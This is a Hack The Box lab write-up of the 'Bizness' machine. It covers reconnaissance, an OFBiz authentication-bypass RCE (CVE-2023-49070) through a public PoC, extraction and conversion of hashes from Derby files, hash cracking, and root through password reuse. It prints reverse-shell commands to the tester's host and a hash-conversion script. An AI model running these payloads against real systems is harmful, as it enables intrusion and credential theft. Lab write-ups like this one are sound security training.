---
title: "HTB Writeup: Bizness"
author: xpnt
date: 2024-05-11
image:
  path: https://pbs.twimg.com/media/GDA3faiXQAA_He5?format=jpg&name=medium
  height: 1500
  width: 500
categories: [Hack The Box,"Season 4: Savage Lands"]
tags: [labs,cryptedBytes,OFBiz,XML-RPC,Bussiness Logic Vulnerability]
---

[Link: Pwned Date](https://www.hackthebox.com/achievement/machine/1504363/582)

# WriteUp

# User

- The pentester starts with a port scan and discovers that ports `22`, `80`, `443`, and `37703` are open. Upon noticing the existence of the domain `bizness.htb`, they proceed to add it to the `/etc/hosts` file.

```bash
# Nmap 7.94SVN scan initiated Thu May  9 22:10:19 2024 as: nmap -sCV -p 22,80,443,37703 -n -Pn -oN scanPorts 10.10.11.252
Nmap scan report for 10.10.11.252
Host is up (0.12s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
80/tcp    open  http       nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp   open  ssl/http   nginx 1.18.0
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.18.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
|_http-title: Did not follow redirect to https://bizness.htb/
|_ssl-date: TLS randomness does not represent time
37703/tcp open  tcpwrapped
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May  9 22:10:40 2024 -- 1 IP address (1 host up) scanned in 20.43 seconds

```


- Upon accessing `bizness.htb`, the pentester noticed that it is a company providing consultancy services and exceptional business solutions across various sectors. To continue enumerating the website, they performed fuzzing and discovered the following directories.

```bash
> curl -s "https://bizness.htb" -k | grep -oP 'src="\K[^"]+|href="\K[^"]+'   | grep -v "#"
img/favicon.png
img/apple-touch-icon.png
https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,700,700i|Montserrat:300,400,500,700
lib/bootstrap/css/bootstrap.min.css
lib/font-awesome/css/font-awesome.min.css
lib/animate/animate.min.css
lib/ionicons/css/ionicons.min.css
lib/owlcarousel/assets/owl.carousel.min.css
lib/lightbox/css/lightbox.min.css
css/style.css
img/logo.png
img/intro-carousel/1.jpg
img/intro-carousel/2.jpg
img/intro-carousel/3.jpg
img/intro-carousel/4.jpg
img/intro-carousel/5.jpg
img/about-mission.jpg
img/about-plan.jpg
img/about-vision.jpg
tel:+155895548855
mailto:info@bizness.htb
https://bootstrapmade.com/
lib/jquery/jquery.min.js
lib/jquery/jquery-migrate.min.js
lib/bootstrap/js/bootstrap.bundle.min.js
lib/easing/easing.min.js
lib/superfish/hoverIntent.js
lib/superfish/superfish.min.js
lib/wow/wow.min.js
lib/waypoints/waypoints.min.js
lib/counterup/counterup.min.js
lib/owlcarousel/owl.carousel.min.js
lib/isotope/isotope.pkgd.min.js
lib/lightbox/js/lightbox.min.js
lib/touchSwipe/jquery.touchSwipe.min.js
contactform/contactform.js
js/main.js
```

```bash
> gobuster dir -u https://bizness.htb  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -r -k --exclude-length 27200
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://bizness.htb
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Exclude Length:          27200
[+] User Agent:              gobuster/3.6
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 200) [Size: 11179]
/catalog              (Status: 200) [Size: 11332]
/marketing            (Status: 200) [Size: 11099]
/ap                   (Status: 200) [Size: 11079]
/ar                   (Status: 200) [Size: 11079]
/ecommerce            (Status: 200) [Size: 530]
/ebay                 (Status: 200) [Size: 11055]
/control              (Status: 200) [Size: 34633]
/manufacturing        (Status: 200) [Size: 11151]
/example              (Status: 200) [Size: 11155]
/bi                   (Status: 200) [Size: 11060]
/accounting           (Status: 200) [Size: 11105]
/webtools             (Status: 200) [Size: 9853]
/facility             (Status: 200) [Size: 11109]
/myportal             (Status: 200) [Size: 10726]
/sfa                  (Status: 200) [Size: 11264]
```

- After finding the following directories, upon accessing any of them, the pentester observed that `bizness.htb` is using `OFBiz` (release `18.12`), which is a suite of business applications flexible enough to be used across any industry.

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240510121609.png)

- Given the existence of `OFBiz` (release `18.12`), the pentester conducted a vulnerability search and found the following CVEs: `CVE-2023-49070` and `CVE-2023-51467`. The core issue of both CVEs is a business logic vulnerability that allows bypassing the authentication process. In the case of `CVE-2023-49070`, this business logic vulnerability, combined with arbitrary deserialization across the outdated XML-RPC protocol, allows for Remote Code Execution (RCE). An excellent explanation is provided by [@jakaba](https://www.vicarius.io/vsociety/posts/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-49070-and-cve-2023-51467).

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240510122803.png)

- Then, they cloned the following [repository](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass), which contains PoCs to exploit `CVE-2023-49070` and achieve RCE. It is necessary to use the `java-1.11.0-openjdk-amd64` version so that the python3 script can correctly use the `ysoserial-all.jar`

```bash
❯ update-java-alternatives -l
java-1.11.0-openjdk-amd64      1111       /usr/lib/jvm/java-1.11.0-openjdk-amd64
java-1.17.0-openjdk-amd64      1711       /usr/lib/jvm/java-1.17.0-openjdk-amd64
java-1.22.0-openjdk-amd64      2211       /usr/lib/jvm/java-1.22.0-openjdk-amd64

> sudo update-java-alternatives -s java-1.11.0-openjdk-amd64 

```

- That's quite a significant achievement! RCE (Remote Code Execution)

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240510124205.png)

- A `fileless method` for obtaining a reverse shell, the simplest approach, and since `nc` is installed, is the following command:

```bash
nc 10.10.14.193 4444 -e /bin/bash
```

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240510125536.png)

>Comments:
> My favorite method when using `ysoserial-all.jar` for RCE is the following payload, which utilizes the concept of [`Bash Brace Expansion`](https://jon.oberheide.org/blog/2008/09/04/bash-brace-expansion-cleverness/):
{: .prompt-info }

```bash
> echo -n 'bash -i >& /dev/tcp/10.10.14.193/4444 0>&1' | base64
# YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTMvNDQ0NCAwPiYx 
> bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTMvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}
# python3 exploit.py --url https://bizness.htb --cmd 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTMvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'
```

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240510130057.png)

# Root

- After exhaustive enumeration, it was discovered that the webserver of the OFBiz software is using the default `Derby` RDBMS. The pentester conducted a password search with the following command, finding `SHA1` hashes (identical for different accounts), indicating the encryption type in use for storing credentials.

```bash
> grep -irnP "password.{10}"
<SNIP>
<UserLogin userLoginId="DemoEmployee1" currentPassword="{SHA}47b56994cbc2b6d10aa1be30f70165adb305a41a"
<SNIP>
```

- After reviewing the [documentation](https://db.apache.org/derby/docs/10.0/manuals/develop/develop13.html), it indicates that the directory `seg0` contains one file for each user table, system table, and index (known as conglomerates) in the `Derby` database. Therefore, the pentester conducted a search for credentials (SHA1 hashes) in the `seg0` directory of the various databases (`ofbiz`, `ofbizolap`, `ofbiztenant`).

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511095407.png)

- Given that the `seg0` directories contain [`.dat`](https://bryanpendleton.blogspot.com/2009/09/whats-in-those-files-in-my-derby-db.html) files, which are binary files related to the tables, etc., `--null-data` was used for a more efficient search. For more information, refer to the [source](https://serverfault.com/a/706710).

```bash
> grep -arinP "pass.{10}" /opt/ofbiz/runtime/data/derby/ofbiz*/seg0 --null-data
> grep -arinP "sha.{10}" /opt/ofbiz/runtime/data/derby/ofbiz*/seg0 --null-data
```

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511101423.png)

- A hash was found, but it does not have the standard format corresponding to a `SHA1` hash. After investigating the relevant documentation, it was discovered that the `HashCrypt.java` class is used for hash encryption. You can find it [here](https://github.com/apache/ofbiz/blob/trunk/framework/base/src/main/java/org/apache/ofbiz/base/crypto/HashCrypt.java#L143).

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511101822.png)

- After reading the relevant code regarding the encryption process, the pentester notes that this process is carried out by the `cryptedBytes` method, where the hash shown will be the result of concatenating the string `hashType`, followed by the string `salt`, and finally returned by the `getCryptBytes` method. It has the following structure: `$SHA$<salt>$<encryption_output>`. It's worth noting that what is sent to the `getCryptBytes` method are the `hashType`, `salt`, and the bytes to be encrypted.


![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511102433.png)

- Upon reviewing the code of the `getCryptedBytes` method, it consists primarily of creating an instance of the encryption algorithm `SHA`, to which the `salt` is first passed, followed by the bytes to be encrypted. Finally, the resulting bytes from the encryption process are passed to the `encodeBase64URLSafeString` method.

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511103342.png)

- According to the documentation of the method `encodeBase64URLSafeString`, it is responsible for encoding the resulting bytes from the encryption process in Base64 and replacing `-` and `_` instead of `+` and `/` character

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511104418.png)

- With all that information, the pentester created a script in `Bash` responsible for converting the format of the `SHA1` hash used in `OFBiz` to be usable with `hashcat` in the correct format.

```bash
#!/bin/bash

# Function to perform the conversion
convert_hash() {
    # Replace '-' and '_' characters with '+' and '/' respectively
    modified_hash=$(echo "$1" | sed 's/-/+/g; s/_/\//g')
    
    # Extract the relevant part after the third '$'
    relevant_part=$(echo "$modified_hash" | awk -F'$' '{print $4}')

    # Calculate the length of the relevant part
    length=$((${#relevant_part} % 4))
    
    # Pad with '=' if necessary
    if [ $length -ne 0 ]; then
        relevant_part="$relevant_part$(printf '=%.0s' $(seq 1 $((4 - length))))"
    fi

    # Decode the Base64 relevant part and convert it to hexadecimal
    hexadecimal=$(echo "$relevant_part" | base64 -d | xxd -ps)

    # Print the result
    echo "The standard representation of the SHA1 hash is: $hexadecimal"
}

# Check if an input argument is provided
if [ $# -ne 1 ]; then
    echo "Usage: $0 '<hash>' (The '<hash>' must be between single quotes)"
    exit 1
fi

# Call the function with the provided argument
convert_hash "$1"

```

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511115311.png)

- Finally, the pentester was able to crack the `SHA1` hash using `hashcat`.

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511113551.png)

- Later, the pentester suspected that there might be credential reuse. Therefore, they used the credential for the user `admin` (`monkeybizness`) for the user `root`, successfully escalating privileges to `root` and being able to read the `root.txt` file.

![](/assets/images/HTB-Writeup-Bizness/Pasted image 20240511113903.png)

>I hope you had as much fun reading this write up as I did writing it. If this writeup helped you, please feel free to go to my [`Hack The Box profile (xpnt)`](https://app.hackthebox.com/users/1504363) and give me a respect 😁. Happy Hacking!!👾
{: .prompt-tip }